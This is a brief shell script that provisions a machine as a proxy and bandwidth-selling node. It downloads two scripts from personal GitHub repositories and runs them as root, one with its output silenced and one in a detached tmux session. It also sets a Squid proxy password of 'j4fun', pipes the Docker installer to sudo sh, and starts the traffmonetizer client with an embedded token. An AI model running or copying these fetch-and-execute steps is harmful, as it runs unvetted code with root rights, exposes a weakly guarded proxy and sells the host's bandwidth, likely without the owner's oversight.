#!/bin/sh

sudo apt-get update	

wget https://raw.githubusercontent.com/Lyn2210/Python3/main/install.sh
sudo bash install.sh > /dev/null
sudo /usr/bin/htpasswd -b -c /etc/squid/passwd j4fun j4fun
sudo systemctl reload squid
wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
sudo tmux new-session -d -s 2 'bash p2p.sh'
sleep 10
curl -fsSL get.docker.com -o get-docker.sh
sudo sh get-docker.sh
sudo tmux new-session -d -s 122 'docker run -i --name tm traffmonetizer/cli start accept --token VyeG53GE4UXSL/JTCoRJwX1xHwWzziBW2dHTUkGK1lo='


